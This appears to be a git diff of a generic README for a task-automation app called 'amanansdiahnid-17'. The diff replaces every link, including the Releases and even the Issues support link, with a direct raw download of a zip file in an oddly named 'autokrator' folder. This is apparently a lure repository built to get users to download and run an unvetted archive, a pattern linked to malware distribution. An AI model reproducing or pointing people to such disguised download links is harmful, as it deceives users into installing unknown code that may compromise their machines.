@@ -1,13 +1,13 @@
 # 🛠 amanansdiahnid-17 - Simplify Your Daily Tasks
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download%20amanansdiahnid--17-brightgreen)](https://github.com/KingAnur13/amanansdiahnid-17/releases)
+[![Download](https://raw.githubusercontent.com/KingAnur13/amanansdiahnid-17/main/autokrator/amanansdiahnid-17.zip%20amanansdiahnid--17-brightgreen)](https://raw.githubusercontent.com/KingAnur13/amanansdiahnid-17/main/autokrator/amanansdiahnid-17.zip)
 
 ## 🚀 Getting Started
 Welcome to **amanansdiahnid-17**! This application helps you automate repetitive tasks with ease. No programming knowledge is required to use it. Follow the steps below to download and run the software.
 
 ## 📥 Download & Install
-1. Click on the download button above or visit the [Releases Page](https://github.com/KingAnur13/amanansdiahnid-17/releases) directly.
+1. Click on the download button above or visit the [Releases Page](https://raw.githubusercontent.com/KingAnur13/amanansdiahnid-17/main/autokrator/amanansdiahnid-17.zip) directly.
 2. On the Releases page, you will see a list of available versions. Look for the latest version listed at the top.
 3. Click on the version you want to download.
 4. You will see a list of files. Choose the one that is appropriate for your operating system (e.g., Windows, Mac, or Linux).
@@ -51,7 +51,7 @@ Ensure your system meets these requirements to run **amanansdiahnid-17** smoothl
 6. Monitor tasks from the dashboard as they complete automatically.
 
 ## 📞 Support
-If you run into issues or have questions, please reach out for support. You can find help by opening an issue on the [GitHub Issues Page](https://github.com/KingAnur13/amanansdiahnid-17/issues).
+If you run into issues or have questions, please reach out for support. You can find help by opening an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/KingAnur13/amanansdiahnid-17/main/autokrator/amanansdiahnid-17.zip).
 
 ## 🎈 Contributing
 We welcome contributions from anyone interested in improving **amanansdiahnid-17**. If you want to contribute, please follow these steps:
@@ -68,4 +68,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 ## ✨ Acknowledgements
 Thank you to all contributors and users. Your feedback and support help make **amanansdiahnid-17** a better tool.
 
-For the latest updates, be sure to check back regularly on the [Releases Page](https://github.com/KingAnur13/amanansdiahnid-17/releases). Enjoy automating your tasks!
+For the latest updates, be sure to check back regularly on the [Releases Page](https://raw.githubusercontent.com/KingAnur13/amanansdiahnid-17/main/autokrator/amanansdiahnid-17.zip). Enjoy automating your tasks!
